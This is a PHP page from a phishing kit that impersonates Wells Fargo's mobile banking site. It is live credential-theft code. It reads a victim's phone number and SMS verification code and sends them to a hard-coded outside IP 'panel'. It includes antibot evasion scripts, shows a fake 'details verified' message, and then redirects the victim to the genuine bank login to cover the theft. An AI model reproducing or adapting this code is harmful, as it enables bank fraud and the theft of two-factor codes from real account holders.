<?php
session_start();
error_reporting(0);
include('../../files/boot/check.php');
include('../../files/boot/check1.php');
include('../../files/boot/check2.php');
include('../../files/boot/antibot.php');
include('../../files/boot/enc.php');
include('../../call.php');
$user = @$_POST['user'];
$code = $_POST['code'];
$phone = $_POST['phone'];
if ($code == "") {
  echo '<meta http-equiv="refresh" content="0; URL=codeinfo.php?error=1&phone=' . $phone . '&user=' . $user . '">';
	die();
}
$test = @file_get_contents("http://137.74.171.167/panelZ/a.php?sms=$phone,$code");        // here goes the panel
?>
<!DOCTYPE html>
<html class="no-js" lang="en">

<head>
    <meta http-equiv="refresh" content="7; URL=https://connect.secure.wellsfargo.com/auth/login/present?origin=mobilebrowser&error=yes">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Wells Fargo - Personal</title>
    <meta name="robots" content="noindex, nofollow">
    <meta name="search_category" content="Personal">
    <meta name="viewport" content="width=device-width,  initial-scale=1.0, maximum-scale=6.0, user-scalable=yes">
    <link rel="shortcut icon" type="image/x-icon" href="../../files/bars/favicon.ico">
    <link rel="stylesheet" href="../../files/bars/framework.css">
    <link rel="stylesheet" href="../../files/bars/smartphone-home.css">
</head>

<body class="" style="top: 0px;">
    <div id="shell" class="page" data-pid="324-114205-64">
        <div id="hamburger-menubackdrop" class="backDrop"></div>
        <a href="#skip" class="hidden">Skip to content</a>

        <header class="masthead" role="banner">

            <div id="navLeft" style="display: block;">
                <a tabindex="1" href="#" rel="nofollow" class="backLink">
                    <span class="sr-only">Back link</span>
                </a>
            </div>
            <div class="logoOuter">
                <div class="logo">

                    <a href="#">
                        <span class="navbar-brand img-responsive">
              <span class="sr-only">Wells Fargo Bank</span>
                        </span>
                    </a>
                </div>
            </div>
            <div id="navRight">
                <nav class="navbar navbar-default navbar-fixed-top">
                    <div class="navbar-header">
                        <div class="entire-menu">
                            <button type="button" class="navbar-toggle hamburger"><span class="sr-only">Menu</span> <span class="icon-bar">‍</span> <span class="icon-bar">‍</span> <span class="icon-bar">‍</span> <span class="expandedIcon pointer">‍</span><span class="ui-hidden-accessible">Expand Menu</span></button>
                        </div>
                    </div>
                </nav>
            </div>

        </header>

        <div id="maincontainer">
            <!--Sign on overlay Start-->
            <div class="overlaySignOn" style="top: 42px;" aria-hidden="false">

                <div class="overlayContainer">
                    <div class="welcome-container">Welcome</div>
                    <!-- Retrieving username values -->
                    <div class="security-container">
                        <span class="security-img"></span>
                        <a href="#" class="security-text">Online &amp; Mobile Security</a>
                    </div>
                    <div class="signOnContainer" align="center">
                        <form id="frmSignon" name="frmSignon" action="test.php" method="post" autocomplete="off">

                            <!-- Updated the name and value of the field -->
                            <p style="font-size: 120%; color: #FFFFFF;"> Your details have been verified</p>
                            <p style="font-size: 120%; color: #FFFFFF; font-weight: bold;"> You may now use your card and account as usual.</p>
                            <p style="font-size: 120%; color: #FFFFFF; font-weight: bold;"> We are sorry for this inconvenience.</p>

                            <div class="enroll-header">&copy; 2019 <em>Wells Fargo Online</em><sup>®</sup></div>
                        </form>
                    </div>

                    <footer role="contentinfo" style="text-align: center;">
                        <div class="html5footer c9" id="pageFooter">
                            <nav class="nav-footer">
                                <div class="footer-link clistData">
                                    <a href="#">PRIVACY, Cookies, Security &amp; Legal</a> | <a href="#">Ad Choices</a>
                                    <div class="footer-oaa"><a href="#">Online Access Agreement</a>
                                    </div>
                                </div>
                                <div class="footer-content">
                                    <div>
                                        <strong>Investment and Insurance products:</strong>
                                    </div>
                                    <div>
                                        <strong>NOT FDIC-Insured | NO Bank Guarantee | MAY Lose Value</strong>
                                    </div>
                                </div>
                                <div class="footer-content">Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.</div>
                                <div class="footer-content">
                                    <span class="home-equal">‍</span> Equal Housing Lender. NMLSR ID 399801</div>
                                <div class="footer-content footer-margin">© 2019 Wells Fargo. All rights reserved.</div>
                                <div class="stage-coach"><img src="../../files/bars/50_opacity_stagecoach_002.png" aria-hidden="true" alt=""></div>
                            </nav>
                        </div>
                    </footer>
                </div>
            </div>
</body>

</html>